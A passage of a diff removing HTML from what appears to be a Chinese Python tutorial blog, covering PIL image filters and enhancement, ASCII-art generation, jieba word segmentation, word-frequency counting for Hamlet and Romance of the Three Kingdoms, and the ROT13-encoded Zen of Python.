-<td>ImageFilter.DETAIL</td>
-<td>图像的细节效果</td>
-</tr>
-<tr>
-<td>ImageFilter.EDGE_ENHANCE</td>
-<td>图像的边界加强效果</td>
-</tr>
-<tr>
-<td>ImageFilter.EDGE_ENHANCE_MORE</td>
-<td>图像的阀值边界效果加强</td>
-</tr>
-<tr>
-<td>ImageFilter.EMBOSS</td>
-<td>图像的浮雕效果</td>
-</tr>
-<tr>
-<td>ImageFilter.FIND_EDGES</td>
-<td>图像的边界效果</td>
-</tr>
-<tr>
-<td>ImageFilter.SMOOTH</td>
-<td>图像的平滑效果</td>
-</tr>
-<tr>
-<td>ImageFilter.SMOOTH_MORE</td>
-<td>图像的阀值平滑效果</td>
-</tr>
-<tr>
-<td>ImageFilter.SHARPEN</td>
-<td>图像的锐化效果</td>
-</tr>
-</tbody></table>
-<p>（2）利用Image类的filter()方法可以使用ImageFilter类，使用方式如下：</p>
-<pre><code class="python">Image.filter(ImageFilter.fuction)</code></pre>
-<p>（3）图像轮廓获取。</p>
-<pre><code class="python">from PIL import Image
-from PIL import ImageFilter
-im = Image.open(&quot;01.jpg&quot;)
-om = im.filter(ImageFilter.CONTOUR)
-om.save(&quot;01Contour.jpg&quot;)</code></pre>
-<p><img src="https://i.loli.net/2021/03/31/SBdyCt7V1rULe39.png" alt="image-20210331194927169"></p>
-<p>（4）ImageEnhance类提供了更高级的图像增强功能，如调整色彩度、亮度、对比度、锐化等。如下表所示。</p>
-<table>
-<thead>
-<tr>
-<th>方法</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>ImageEnhance.enhance(factor)</td>
-<td>对选择属性的数值增强factor倍</td>
-</tr>
-<tr>
-<td>ImageEnhance.Color(im)</td>
-<td>调整图像的颜色平衡</td>
-</tr>
-<tr>
-<td>ImageEnhance.Contrast(im)</td>
-<td>调整图像的对比度</td>
-</tr>
-<tr>
-<td>ImageEnhance.Brightness(im)</td>
-<td>调整图像的亮度</td>
-</tr>
-<tr>
-<td>ImageEnhance.Sharpness(im)</td>
-<td>调整图像的锐度</td>
-</tr>
-</tbody></table>
-<p>（5）图像的对比度增强</p>
-<pre><code class="python">from PIL import Image
-from PIL import ImageEnhance
-im = Image.open(&quot;01.jpg&quot;)
-om = ImageEnhance.Contrast(im)
-om.enhance(20).save(&#39;01Contrast.jpg&#39;)</code></pre>
-<p><img src="https://i.loli.net/2021/03/31/YmFkhMqzOUdygJ1.png" alt="image-20210331200703081"></p>
-<h3 id="图像的字符画绘制"><a href="#图像的字符画绘制" class="headerlink" title="图像的字符画绘制"></a>图像的字符画绘制</h3><p>（1）位图图片是由不同颜色像素点组成的规则分布，如果采用字符串代替像素，图像就成为了字符画。</p>
-<p>（2）首先定义一个字符集，将这个字符集代替图像中的像素点，使得每个字符对应图像中的不同颜色。字符的种类越多则越能还原图像的色彩变化，图片也更加富有层次感。</p>
-<pre><code class="python">ascii_char = list(&quot;$@B%8&amp;WM#*oahkbdpqwmZO0QLCJUYXzcvunxrjf/1234568795t\/|()1&#123;&#125;[]?-_+~&lt;&gt;i!;:,\^`.&#39;&quot;)</code></pre>
-<p>（3）图像的色彩信息无法被黑白ASCII字符直接模拟，可以使用灰度值将彩色图像转换为高质量的黑白文稿。灰度值指黑白图像中的颜色深度，<strong>白色为255,黑色为0</strong>。</p>
-<p>（4）这里定义，灰度值从大到小依次使用字符集中从左到右的符号，因此，可以直接求出不同灰度值在字符集中对应的字符编号。</p>
-<p>（5）定义色彩向灰度转换的公式如下，其中**R、G、B分别是像素点的RGB颜色值：</p>
-<pre><code class="python">Gray = R * 0.2126 + G * 0.7152 + B * 0.0722</code></pre>
-<p>像素的RGB颜色值与字符集的对应函数如下：</p>
-<pre><code class="python">def get_char(r, b, g, alpha=256):
-    if alpha == 0:
-        return &#39; &#39;
-    gray = int(0.2126 * r + 0.7152 * g + 0.0722 * b)
-    unit = 256 / len(ascii_char)
-    return ascii_char[gray//unit]</code></pre>
-<p>（6）为使生成的字符画有最佳效果，可利用PIL库中的Image类的resize(size)函数对图片重新设定大小size。size是一个二元元组，分别表示<strong>新图像的长度和宽度。</strong>resize()函数不是简单地改变图像的大小，而是对像素在新尺寸下重新排列。</p>
-<p>（7）创建一个空字符串txt，然后利用一个嵌套循环向里面添加字符。<strong>im.getpixel()方法可以返回给定图像位置的像素值。</strong>若图像为多通道，则返回一个RGB颜色元组。</p>
-<p>（8）@#￥这类字符有浓密的色彩感，而_!{}/|这类字符空白较多，适合表示浅色。生成字符画后可根据字符集和图像的对照适当修改字符排列顺序。如将背景色对应的字符修改为_或/，将浓墨重彩的地方使用@*或B&amp;表示会更有层次感。</p>
-<pre><code class="python">from PIL import Image
-ascii_char = list(&quot;$@B%8&amp;WM#*oahkbdpqwmZO0QLCJUYXzcvunxrjf/1234568795t\/|()1&#123;&#125;[]?-_+~&lt;&gt;i!;:,\^`.&quot;)
-def get_char(r, b, g, alpha=256):
-    if alpha == 0:
-        return &#39; &#39;
-    gray = int(0.2126 * r + 0.7152 * g + 0.0722 * b)
-    x = int((gray / (alpha + 1.0)) * len(ascii_char))
-    return ascii_char[x]
-def main():
-    im = Image.open(&quot;3.jpg&quot;)
-    width, height = 100, 60
-    im = im.resize((width,height))
-    txt = &quot;&quot;
-    for i in range(height):
-        for j in range(width):
-            txt += get_char(*im.getpixel((j,i)))
-        txt += &#39;\n&#39;
-    fo = open(&quot;pic_char.txt&quot;,&quot;w&quot;)
-    fo.write(txt)
-    fo.close()
-main()</code></pre>
-<p>扩展：位图图像和矢量图</p>
-<ul>
-<li>位图亦称为点阵图像，由像素阵列组成。放大时会失真，但却能表达色彩丰富的图像效果。</li>
-<li>矢量图使用直线和曲线来描述图形，复杂图形是通过数学公式计算获得的。放大、缩小或旋转时不失真，但难以表现色彩层次丰富的图像效果。</li>
-</ul>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">Python</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/03/27/Python/%E6%B7%B1%E5%85%A5Python%E8%AF%AD%E8%A8%80(%E4%B9%9D)-%E6%96%87%E4%BB%B6%E5%92%8C%E6%95%B0%E6%8D%AE%E6%A0%BC%E5%BC%8F%E5%8C%9601/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Python/深入Python语言(八)-组合数据类型02" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/03/25/Python/%E6%B7%B1%E5%85%A5Python%E8%AF%AD%E8%A8%80(%E5%85%AB)-%E7%BB%84%E5%90%88%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B02/">深入Python语言(八)-组合数据类型02</a>
-    </h1>
-  
-
-        
-        <a href="/2021/03/25/Python/%E6%B7%B1%E5%85%A5Python%E8%AF%AD%E8%A8%80(%E5%85%AB)-%E7%BB%84%E5%90%88%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B02/" class="archive-article-date">
-  	<time datetime="2021-03-25T13:21:50.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-03-25</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="jieba库的使用"><a href="#jieba库的使用" class="headerlink" title="jieba库的使用"></a>jieba库的使用</h2><h3 id="jieba概述"><a href="#jieba概述" class="headerlink" title="jieba概述"></a>jieba概述</h3><p>（1）对于一段英文文本，若要提取其中的单词，只需使用<strong>字符串处理的split()方法</strong>即可。例如：</p>
-<pre><code class="python">&gt;&gt;&gt; &quot;China is a great country&quot;.split()#split通过指定分隔符对字符串进行分片，默认以空格进行分片。
-[&#39;China&#39;, &#39;is&#39;, &#39;a&#39;, &#39;great&#39;, &#39;country&#39;]
-
-
-&gt;&gt;&gt;print str.split(&#39; &#39;, 1 ); # 以空格为分隔符，分隔成两个(num+1)子字符串</code></pre>
-<p>（2）对于一段中文文本，若要提取其中的单词则会缺少分隔符，因此需要引入jieba库。<strong>jieba（“结巴”）是Python中一个重要的第三方中文分词函数库，</strong>例如：</p>
-<pre><code class="python">&gt;&gt;&gt;import jieba
-&gt;&gt;&gt;jieba.lcut(&quot;中国是一个伟大的国家&quot;)
-[&#39;中国&#39;, &#39;是&#39;, &#39;一个&#39;, &#39;伟大&#39;, &#39;的&#39;, &#39;国家&#39;]</code></pre>
-<p>（3）jieba是第三方库，不是Python安装包自带的，因此需要通过pip指令安装，pip安装命令如下：</p>
-<pre><code>:\&gt;pip install jieba #或者 pip3 install jieba</code></pre>
-<p>（4）jieba库的分词原理是利用一个中文词库，将待分词的内容与分词词库进行比对，通过图结构和动态规划方法找到最大概率的词组。除了分词，<strong>jieba还提供增加自定义中文单词的功能。</strong></p>
-<p>（5）jieba库支持3种分词模式：</p>
-<ul>
-<li>精确模式，将句子最精确地切开，适合文本分析。</li>
-<li>全模式，把句子中所有可以成词的词语都扫描出来，速度很快，但不能消除歧义。</li>
-<li>搜索引擎模式，在精确模式的基础上，对长词再次切分，提高召回率，适用于搜索引擎分词。 </li>
-</ul>
-<h3 id="jieba库解析"><a href="#jieba库解析" class="headerlink" title="jieba库解析"></a>jieba库解析</h3><p>（1）jieba库主要提供分词功能，可以辅助自定义分词词典。jieba库中包含的主要函数如下表所示：</p>
-<table>
-<thead>
-<tr>
-<th align="center">函数</th>
-<th align="center">描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">jieba.cut(s)</td>
-<td align="center">精确模式，返回一可迭代的数据类型</td>
-</tr>
-<tr>
-<td align="center">jieba.cut(s,cut_all=True)</td>
-<td align="center">全模式，输出文本s中所有可能的单词</td>
-</tr>
-<tr>
-<td align="center">jieba.cut_for_search(s)</td>
-<td align="center">搜索引擎模式，适合搜索引擎建立索引的分词结果</td>
-</tr>
-<tr>
-<td align="center"><strong>jieba.lcut(s)</strong></td>
-<td align="center"><strong>精确模式，返回一个列表类型，建议使用</strong></td>
-</tr>
-<tr>
-<td align="center"><strong>jieba.lcut(s,cut_all=True)</strong></td>
-<td align="center"><strong>全模式，返回一个列表类型，建议使用</strong></td>
-</tr>
-<tr>
-<td align="center"><strong>jieba.lcut_for_search(s)</strong></td>
-<td align="center"><strong>搜素引擎模式，返回一个列表类型，建议使用</strong></td>
-</tr>
-<tr>
-<td align="center">jieba.add_word(w)</td>
-<td align="center">向分词词典中增加新词w</td>
-</tr>
-</tbody></table>
-<p>（2）针对上述分词函数，举例如下：</p>
-<pre><code class="python">&gt;&gt;&gt; jieba.lcut(&quot;中华人民共和国是一个伟大的国家&quot;)
-[&#39;中华人民共和国&#39;, &#39;是&#39;, &#39;一个&#39;, &#39;伟大&#39;, &#39;的&#39;, &#39;国家&#39;]
-&gt;&gt;&gt; jieba.lcut(&quot;中华人民共和国是一个伟大的国家&quot;, cut_all=True)
-[&#39;中华&#39;, &#39;中华人民&#39;, &#39;中华人民共和国&#39;, &#39;华人&#39;, &#39;人民&#39;, &#39;人民共和国&#39;, &#39;共和&#39;, &#39;共和国&#39;, &#39;国是&#39;, &#39;一个&#39;, &#39;伟大&#39;, &#39;的&#39;, &#39;国家&#39;]
-&gt;&gt;&gt; jieba.lcut_for_search(&quot;中华人民共和国是一个伟大的国家&quot;)
-[&#39;中华&#39;, &#39;华人&#39;, &#39;人民&#39;, &#39;共和&#39;, &#39;共和国&#39;, &#39;中华人民共和国&#39;, &#39;是&#39;, &#39;一个&#39;, &#39;伟大&#39;, &#39;的&#39;, &#39;国家&#39;]</code></pre>
-<p>（3）jieba.lcut()函数返回精确模式，<strong>输出的分词能够完整且不多余地组成原始文本；</strong>jieba.lcut(,True)函数返回全模式，<strong>输出原始文本中可能产生的所有问题，冗余性最大；</strong>jieba.lcut_for_search()函数返回搜索引擎模式，<strong>该模式首先执行精确模式，然后再对其中的长词进一步切分获得结果。</strong></p>
-<p>（4）默认情况下，上述表格中的6个分词函数可以较高概率识别自定义的新词，例如名字或缩写。而对于无法识别的分词，也可以通过jieba.add_word()函数向分词库添加，例如：</p>
-<pre><code class="python">&gt;&gt;&gt; jieba.lcut(&quot;嵩天老师在努力教学Python语言&quot;)
-[&#39;嵩天&#39;, &#39;老师&#39;, &#39;在&#39;, &#39;努力&#39;, &#39;教学&#39;, &#39;Python&#39;, &#39;语言&#39;]
-&gt;&gt;&gt; jieba.lcut(&quot;习大大期盼有更好的教育&quot;)
-[&#39;习&#39;, &#39;大大&#39;, &#39;期盼&#39;, &#39;有&#39;, &#39;更好&#39;, &#39;的&#39;, &#39;教育&#39;]
-&gt;&gt;&gt; jieba.add_word(&quot;习大大&quot;)
-&gt;&gt;&gt; jieba.lcut(&quot;习大大期盼有更好的教育&quot;)
-[&#39;习大大&#39;, &#39;期盼&#39;, &#39;有&#39;, &#39;更好&#39;, &#39;的&#39;, &#39;教育&#39;]</code></pre>
-<p>拓展：<strong>第三方库</strong></p>
-<ul>
-<li>Python语言的第三方库指不在Python安装包中的函数库，也是非标准函数库，这类函数库一般由全球各领域专业人士结合专业特点和兴趣开发。</li>
-<li>Python语言构建了一个开放和自由的生态环境，随着Python语言的发展，一些稳定的第三方库不断被加入标准库。</li>
-</ul>
-<h2 id="文本词频统计"><a href="#文本词频统计" class="headerlink" title="文本词频统计"></a>文本词频统计</h2><p>词频统计只是累加问题，可用字典来解决。以词语为键，计数器为值，构成&lt;单词&gt;:&lt;出现次数&gt;的键值对即可。</p>
-<h3 id="Hamlet-《哈姆雷特》英文词频统计"><a href="#Hamlet-《哈姆雷特》英文词频统计" class="headerlink" title="Hamlet-《哈姆雷特》英文词频统计"></a>Hamlet-《哈姆雷特》英文词频统计</h3><p>（1）统计英文词频的第一步：<strong>分解并提取英文文章的单词。</strong>，同一个单词会存在大小写不同形式，但计数却不能区分大小写。假设Hamlet文本由变量txt表示，</p>
-<ul>
-<li><strong>可以通过txt.lower()函数将字母变成小写，</strong>排除原文大小写差异对词频统计的干扰。</li>
-<li>英文单词的分隔可以是空格、标点符号或者特殊符号。<strong>可以将各特殊字符和标点符号使用txt.replace()方法替换成空格，再提取单词。</strong></li>
-</ul>
-<p>（2）统计词频的第二步：对每个单词进行计数。假设将单词保存在变量word中，使用一个字典类型counts={}，统计单词出现的次数可采用如下代码：</p>
-<pre><code class="python">counts[word] = counts[word] + 1</code></pre>
-<ul>
-<li>当遇到一个新词时，单词没有出现在字典结构中，则需要再字典中新建键值对：</li>
-</ul>
-<pre><code class="python">counts[new_word] = 1</code></pre>
-<ul>
-<li>因此，无论词是否在字典中，加入字典counts中的处理逻辑可以统一表示如下：</li>
-</ul>
-<pre><code class="python">if word in counts:
-    counts[word] = counts[word] + 1
-else:
-    counts[word] = 1
-
-#或者，这个处理逻辑可以更简洁地表示如下代码：
-counts[word] = counts.get(word,0) + 1    
-#若word在counts中,则返回word对应的值，若word不再counts中，则默认返回0</code></pre>
-<p>（3）统计词频的第三步：对单词的统计值从高到低进行排序，输出前20个高频单词，并格式化打印输出。由于字典类型没有顺序，需要将其转换为有顺序的列表类型，再使用<strong>sort()方法和lambda函数配合实现根据单词出现的次数对元素进行排序。</strong>最后输出排序前10位的单词。</p>
-<pre><code class="python">items = list(counts.items())     #将字典转换为记录列表
-items.sort(key=lambda x:x[1], reverse=True)    #指定记录第2列排序 ，降序排序
-&#39;&#39;&#39;
-sort() 函数用于对原列表进行排序，如果指定参数，则使用比较函数指定的比较函数。
-list.sort( key=None, reverse=False)
-reverse = True 降序， reverse = False 升序（默认）。
-&#39;&#39;&#39;
-
-&#39;&#39;&#39;匿名函数
-&lt;函数名&gt; = lambda &lt;参数列表&gt;： &lt;表达式&gt;
-等价于：
-def &lt;函数名&gt;(&lt;参数列表&gt;)：
-   #return &lt;表达式&gt;
-&#39;&#39;&#39;</code></pre>
-<ul>
-<li>采用函数对获取和整理文本进行封装，以下是完整代码：</li>
-</ul>
-<pre><code class="python">def getText():
-    txt = open(&quot;hamlet.txt&quot;, &quot;r&quot;).read()
-    txt = txt.lower()
-    for ch in &#39;!&quot;#$%&amp;()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~&#39;:
-        txt = txt.replace(ch, &quot; &quot;)  #将文本中的特殊字符替换为空格
-    return txt
-hamletTxt = getText()
-words = hamletTxt.split()           #默认以空格对文本分片
-counts = &#123;&#125;
-for word in words:
-    counts[word] = counts.get(word,0) + 1
-items = list(counts.items())
-#print(items)
-items.sort(key=lambda x:x[1], reverse=True)
-for i in range(10):
-    word, count = items[i]
-    print(&quot;&#123;0:&lt;10&#125;&#123;1:&gt;5&#125;&quot;.format(word,count)) #0代表word,&lt;表示向左对齐；1代表count,&gt;表示向右对齐，默认采用空格填充。
-
-#运行结果如下：
-the        1138
-and         965
-to          754
-of          669
-you         550
-i           542
-a           542
-my          514
-hamlet      462
-in          436</code></pre>
-<ul>
-<li>观察输出结果可知，高频单词大多数是冠词、代词、连接词等语法型词汇，并不能代表文章含义。因此，需要采用<strong>集合类型构建一个排除词汇库excludes</strong>，在输出结果中排除这个词汇库中的内容，具备这样功能程序的完整代码如下：</li>
-</ul>
-<pre><code class="python">excludes = &#123;&quot;the&quot;,&quot;and&quot;,&quot;of&quot;,&quot;you&quot;,&quot;a&quot;,&quot;i&quot;,&quot;my&quot;,&quot;in&quot;&#125;
-def getText():
-    txt = open(&quot;hamlet.txt&quot;, &quot;r&quot;).read()
-    txt = txt.lower()
-    for ch in &#39;!&quot;#$%&amp;()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~&#39;:
-        txt = txt.replace(ch, &quot; &quot;)
-    return txt
-hamletTxt = getText()
-words = hamletTxt.split()
-counts = &#123;&#125;
-for word in words:
-    counts[word] = counts.get(word,0) + 1
-for word in excludes:
-    del(counts[word])
-items = list(counts.items())
-items.sort(key=lambda x:x[1], reverse=True)
-#print(items)
-for i in range(10):
-    word, count = items[i]
-    print(&quot;&#123;0:&lt;10&#125;&#123;1:&gt;5&#125;&quot;.format(word,count))
-
-#运行结果如下：
-&gt;&gt;&gt;
-to          754
-hamlet      462
-it          416
-that        391
-is          340
-not         314
-lord        309
-his         296
-this        295
-but         269
-#可通过继续增加excludes中的内容，以排除更多的词汇。</code></pre>
-<h3 id="《三国演义》人物出场统计"><a href="#《三国演义》人物出场统计" class="headerlink" title="《三国演义》人物出场统计"></a>《三国演义》人物出场统计</h3><p>（1）中文文章需要用到jieba库才能进行词频统计，代码如下：</p>
-<pre><code class="python">import jieba
-txt = open(&quot;三国演义.txt&quot;, &quot;r&quot;, encoding=&#39;utf-8&#39;).read()
-words = jieba.lcut(txt)
-counts = &#123;&#125;
-for word in words:
-    if len(word) == 1 :
-        continue
-    else:
-        counts[word] = counts.get(word,0) + 1
-items = list(counts.items())
-items.sort(key = lambda x:x[1], reverse=True)
-for i in range(15):
-    word,count=items[i]
-    print (&quot;&#123;0:&lt;10&#125;&#123;1:&gt;5&#125;&quot;.format(word,count))
-
-#运行结果如下：
-&gt;&gt;&gt;
-曹操          939
-孔明          831
-将军          746
-却说          647
-玄德          570
-丞相          489
-关公          484
-二人          464
-不可          430
-荆州          413
-孔明曰         384
-玄德曰         383
-不能          381
-如此          375
-张飞          349</code></pre>
-<ul>
-<li>增加排除词库exclude</li>
-</ul>
-<pre><code class="python">import jieba
-excludes = &#123;&quot;将军&quot;,&quot;却说&quot;,&quot;荆州&quot;,&quot;二人&quot;,&quot;不可&quot;,&quot;不能&quot;,&quot;如此&quot;&#125;
-txt = open(&quot;三国演义.txt&quot;, &quot;r&quot;, encoding=&#39;utf-8&#39;).read()
-words = jieba.lcut(txt)
-counts = &#123;&#125;
-for word in words:
-    if len(word) == 1 :
-        continue
-    elif word==&quot;诸葛亮&quot; or word== &quot;孔明曰&quot;:
-        rword = &quot;孔明&quot;
-    elif word==&quot;关公&quot; or word==&quot;云长&quot;:
-        rword = &quot;关羽&quot;
-    elif word == &quot;玄德&quot; or word == &quot;玄德曰&quot;:
-        rword = &quot;刘备&quot;
-    elif word ==&quot;孟德&quot; or word == &quot;丞相&quot;:
-        rword = &quot;曹操&quot;
-    else:
-        rword = word
-    counts[rword] = counts.get(rword,0) + 1
-for word in excludes:
-    del(counts[word])
-items = list(counts.items())
-items.sort(key = lambda x:x[1], reverse=True)
-for i in range(5):
-    word,count=items[i]
-    print (&quot;&#123;0:&lt;10&#125;&#123;1:&gt;5&#125;&quot;.format(word,count))
-
-#运行结果
-&gt;&gt;&gt;
-曹操         1435
-孔明         1378
-刘备         1225
-关羽          753
-张飞          349</code></pre>
-<h2 id="Python之禅"><a href="#Python之禅" class="headerlink" title="Python之禅"></a>Python之禅</h2><p>（1）Python编译器以函数库的形式内置了一个有趣的文件，被称为“Python之禅”（The Zen of Python）。当调用如下一行语句后，会出现一段有趣的结果。</p>
-<pre><code class="python">import this
-
-#运行结果
-The Zen of Python, by Tim Peters
-
-Beautiful is better than ugly.
-Explicit is better than implicit.
-Simple is better than complex.
-Complex is better than complicated.
-Flat is better than nested.
-Sparse is better than dense.
-Readability counts.
-Special cases aren&#39;t special enough to break the rules.
-Although practicality beats purity.
-Errors should never pass silently.
-Unless explicitly silenced.
-In the face of ambiguity, refuse the temptation to guess.
-There should be one-- and preferably only one --obvious way to do it.
-Although that way may not be obvious at first unless you&#39;re Dutch.
-Now is better than never.
-Although never is often better than *right* now.
-If the implementation is hard to explain, it&#39;s a bad idea.
-If the implementation is easy to explain, it may be a good idea.
-Namespaces are one honking great idea -- let&#39;s do more of those!</code></pre>
-<p>（2）在Python安装目录中找到Lib/this.py文件，该程序内容如下：</p>
-<pre><code class="python">s = &quot;&quot;&quot;Gur Mra bs Clguba, ol Gvz Crgref
-
-Ornhgvshy vf orggre guna htyl.
-Rkcyvpvg vf orggre guna vzcyvpvg.
-Fvzcyr vf orggre guna pbzcyrk.
-Pbzcyrk vf orggre guna pbzcyvpngrq.
-Syng vf orggre guna arfgrq.
-Fcnefr vf orggre guna qrafr.
-Ernqnovyvgl pbhagf.
-Fcrpvny pnfrf nera&#39;g fcrpvny rabhtu gb oernx gur ehyrf.
-Nygubhtu cenpgvpnyvgl orngf chevgl.
-Reebef fubhyq arire cnff fvyragyl.
-Hayrff rkcyvpvgyl fvyraprq.
-Va gur snpr bs nzovthvgl, ershfr gur grzcgngvba gb thrff.
-Gurer fubhyq or bar-- naq cersrenoyl bayl bar --boivbhf jnl gb qb vg.
-Nygubhtu gung jnl znl abg or boivbhf ng svefg hayrff lbh&#39;er Qhgpu.
-Abj vf orggre guna arire.
-Nygubhtu arire vf bsgra orggre guna *evtug* abj.
-Vs gur vzcyrzragngvba vf uneq gb rkcynva, vg&#39;f n onq vqrn.
-Vs gur vzcyrzragngvba vf rnfl gb rkcynva, vg znl or n tbbq vqrn.
-Anzrfcnprf ner bar ubaxvat terng vqrn -- yrg&#39;f qb zber bs gubfr!&quot;&quot;&quot;
-
-d = &#123;&#125;
-for c in (65, 97):
-    for i in range(26):
-        d[chr(i+c)] = chr((i+13) % 26 + c)
-
-print(&quot;&quot;.join([d.get(c, c) for c in s]))
-
-
-&#39;&#39;&#39;
-最后一行代码
-首先是一个循环for c in s，这个就是变量输入的字符串；
-然后d.get(c,c) for c in s，对于每一个c，从d里面获取对应的value；
-最后&quot;&quot;.join把上面的结果拼接成一个字符串。
-等价于如下：
-tmp = []
-for c in s:
-    tmp.append(d.get(c, c))
-print &quot;&quot;.join(tmp)
-&#39;&#39;&#39;</code></pre>
-<p>（3)该程序从第1行到第21行是一个字符串s，但该字符串并非明文。将s转换成明文的代码是从23行到28行。</p>
-<ul>
-<li>第23行定义了一个空字典。</li>
-<li>第26行对字典d填充了内容，这个填充<strong>将i+c对应的字符替换为(i+13)%26+c，即将编号循环增加了13。</strong></li>
-<li>chr(65)代表字符’A’，chr(97)代表字符’a’，因此，第23到第26行建立了字母a到z和字母A到Z的一个13位循环移动的对应表。</li>
-</ul>
-<p>密文： A B C D E F G H I J K L M N O P Q R S T U V W X Y Z</p>
-<p>原文： N O P Q R S T U V W X Y Z A B C D E F G H I J K L M</p>
-<p>密文： a b c d e f g h i j k l m n o p q r s t u v w x y z</p>
-<p>原文： n o p q r s t u v w x y z a b c d e f g h i j k l m </p>
-<p>（4）该算法可看作是凯撒密码的一种扩展，相比凯撒密码，这个算法采用循环移动13个位置，直接好处是原文和密文之间的相互转换可以使用同一个程序。</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">Python</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/03/25/Python/%E6%B7%B1%E5%85%A5Python%E8%AF%AD%E8%A8%80(%E5%85%AB)-%E7%BB%84%E5%90%88%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B02/">展开全文 >></a>
         </p>
       
 
